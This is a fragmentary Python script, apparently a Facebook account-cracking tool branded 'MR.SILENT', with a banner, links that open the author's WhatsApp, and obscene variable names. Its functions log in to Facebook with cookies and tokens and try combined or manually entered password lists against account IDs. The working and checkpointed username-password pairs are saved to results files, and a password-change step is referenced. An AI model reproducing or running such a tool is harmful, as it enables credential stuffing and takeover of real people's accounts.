...
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
...
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
...
def logo():
 ...
 ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║
 ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD MR.SILENT║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : MR•SILENT                   {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +09502683666          {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/MR-SILENT/meta{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Free taste {H}Premium{P}     {N}║")
...
def login_cookie():
    ...
    try:
        ...
        input('\n [%sPRESS ENTER%s] to continue'%(H,N))
        os.system('xdg-open https://wa.me/09502683666?text=Hello+izin+use+SC+ini')
        moch_yayan()
...
def moch_yayan():
    ...
    print(f"{P} [{H}•{P}] FB Name   : {name}")
    print(f"{P} [{H}•{P}] FB ID     : {idfb}")
    print(f"{P} [{H}•{P}] Your IP   : {IP}")
    print(f"{P} [{H}•{P}] Join      : {time}")
    print("%s══════════════════════════════════════════"%(N))
...
###### CHECK RESULT CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[SILENT-OK] ","\x1b[1;92m[SILENT-OK] ").replace("[SILENT-CP] ", "\x1b[1;93m[SILENT-CP] ")
...
###### INFO UPDATE & UPGRADE SC #####
        ...
        if upd =="":
            ...
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/09502683666?text=HELLO+izin+use+SC+ini');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] Ok, thank you...")
            jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
        else:
...
def ngomen_post(hencet, token):
    try:
        ...
        for asu in memek.find_all("a",href=True):
            if "See more commentsâ€¦" in asu.text:
...
def log_hasil(user, pasw):
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            ...
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[SILENT CP] {user} • {pasw}\n")
        ...
        open('results/INVALID-OK.txt', 'a').write(f"[SILENT-CP] {user} • {pasw}\n")
#UBAH PW
...
# METODE SANDI MANUAL
    def plerr(self,id):
        ...
        if ___yayanganteng___ in ('raraY', 'raray'):
            ...
            print(' %s[%s!%s] Use %to COME%s for separator\n [%s•%s] Example : %ssilent123%s,%what a waste%s,%space allah'%(N,M,N,H,N,H,N,H,N,H,N,H))
            while True:
...
# PROSES CRACK METODE 3 in 1
    ...
    def kombinasi_pw(self,url):
        ...
        if pw in[""]:
            ...
            print(" %s[%s!%s] Use %to COME%s for separator"%(N,M,N,H,N))
